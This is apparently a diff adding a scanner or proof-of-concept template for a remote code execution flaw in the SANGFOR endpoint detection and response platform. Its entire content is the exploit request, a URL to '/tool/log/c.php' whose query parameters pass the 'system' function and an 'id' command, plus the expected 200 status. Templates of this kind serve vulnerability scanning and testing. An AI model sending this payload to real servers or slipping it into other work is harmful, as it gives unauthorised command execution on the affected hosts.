@@ -1,0 +1,3 @@
+name: "SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE2"
+poc: "/tool/log/c.php?strip_slashes=system&host=id"
+status_code: 200
